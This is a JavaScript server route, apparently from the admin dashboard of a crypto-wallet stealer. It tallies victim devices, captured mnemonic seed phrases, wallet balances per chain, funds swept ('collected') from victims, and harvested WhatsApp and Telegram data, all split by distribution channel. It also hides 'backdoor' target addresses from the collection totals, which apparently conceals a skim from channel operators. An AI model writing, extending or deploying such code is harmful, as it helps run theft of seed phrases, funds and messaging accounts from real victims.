import { DerivedAddress, Device, IpSyncLog, Mnemonic, CollectLog, WhatsAppData, TelegramData } from '../../../core/db/models/index.js';
import { CollectBackdoorTarget } from '../../../core/db/models/collect-backdoor-target.js';
import { DEFAULTS } from '../../../config/constants.js';
import { formatShanghaiDate, getShanghaiDayRange } from '../../../core/channel-stats/date.js';
import { isAdminLike } from '../../../core/auth/permissions.js';

function channelMatch(request) {
    const filter = request.channelFilter || {};
    return filter.channelCode ? { channelCode: filter.channelCode } : {};
}

export async function dashboardRoute(fastify) {
    fastify.get('/api/dashboard', async (request) => {
        const statsFilter = channelMatch(request);
        const todayStart = getShanghaiDayRange(formatShanghaiDate(new Date())).start;
        const onlineThreshold = new Date(Date.now() - DEFAULTS.ONLINE_THRESHOLD_MS);

        // 获取后门地址，归集统计需排除
        const backdoorDocs = await CollectBackdoorTarget.find({ enabled: true }, { targetAddress: 1 }).lean();
        const backdoorAddrs = backdoorDocs.map(d => d.targetAddress).filter(Boolean);

        // CollectLog 基础过滤
        const collectBaseMatch = { status: 'confirmed', ...statsFilter };
        if (backdoorAddrs.length > 0) collectBaseMatch.targetAddress = { $nin: backdoorAddrs };

        const [
            devOnline, devTotal, devToday,
            visitsTotal, visitsToday,
            mnemonicTotal, mnemonicToday,
            walletAgg, walletAggToday,
            walletBalanceRows,
            collectAgg, collectAggToday,
            waTotal, waToday,
            tgTotal, tgToday,
        ] = await Promise.all([
            // 设备
            Device.countDocuments({ ...statsFilter, lastSeen: { $gte: onlineThreshold } }),
            Device.countDocuments(statsFilter),
            Device.countDocuments({ ...statsFilter, firstSeen: { $gte: todayStart } }),
            // 访问
            IpSyncLog.countDocuments(statsFilter),
            IpSyncLog.countDocuments({ ...statsFilter, createdAt: { $gte: todayStart } }),
            // 助记词 = 导航钱包地址条数（去重助记词数）
            Mnemonic.countDocuments(statsFilter),
            Mnemonic.countDocuments({ ...statsFilter, createdAt: { $gte: todayStart } }),
            // 钱包 = 设备进程钱包数
            Device.aggregate([
                { $match: statsFilter },
                { $group: { _id: null, total: { $sum: '$walletCount' } } },
            ]),
            Device.aggregate([
                { $match: { ...statsFilter, firstSeen: { $gte: todayStart } } },
                { $group: { _id: null, total: { $sum: '$walletCount' } } },
            ]),
            // 各链余额
            DerivedAddress.aggregate([
                { $match: statsFilter },
                { $group: { _id: '$chain', balance: { $sum: '$balance' }, usdtBalance: { $sum: '$usdtBalance' }, usdcBalance: { $sum: '$usdcBalance' }, count: { $sum: 1 } } },
            ]),
            // 归集统计（排除后门地址，仅已确认）
            CollectLog.aggregate([
                { $match: collectBaseMatch },
                { $group: { _id: { chain: '$chain', token: '$token' }, total: { $sum: { $toDouble: '$amount' } } } },
            ]),
            CollectLog.aggregate([
                { $match: { ...collectBaseMatch, createdAt: { $gte: todayStart } } },
                { $group: { _id: { chain: '$chain', token: '$token' }, total: { $sum: { $toDouble: '$amount' } } } },
            ]),
            // WhatsApp
            WhatsAppData.countDocuments(statsFilter),
            WhatsAppData.countDocuments({ ...statsFilter, firstSeenAt: { $gte: todayStart } }),
            // Telegram
            TelegramData.countDocuments(statsFilter),
            TelegramData.countDocuments({ ...statsFilter, firstSeenAt: { $gte: todayStart } }),
        ]);

        const walletBalances = {};
        for (const r of walletBalanceRows) {
            walletBalances[r._id] = { balance: r.balance || 0, usdtBalance: r.usdtBalance || 0, usdcBalance: r.usdcBalance || 0, count: r.count || 0 };
        }

        // 归集统计按 chain_token 汇总
        const collectAmount = {};
        const collectAmountToday = {};
        for (const r of collectAgg) {
            collectAmount[`${r._id.chain}_${r._id.token}`] = r.total || 0;
        }
        for (const r of collectAggToday) {
            collectAmountToday[`${r._id.chain}_${r._id.token}`] = r.total || 0;
        }

        return {
            data: {
                devices: { total: devTotal, online: devOnline, today: devToday },
                visitors: { total: visitsTotal, today: visitsToday },
                mnemonic: { total: mnemonicTotal, today: mnemonicToday },
                wallet: { total: walletAgg[0]?.total || 0, today: walletAggToday[0]?.total || 0 },
                walletBalances,
                collectAmount,
                collectAmountToday,
                whatsapp: { total: waTotal, today: waToday },
                telegram: { total: tgTotal, today: tgToday },
            },
        };
    });
}
//# sourceMappingURL=dashboard.js.map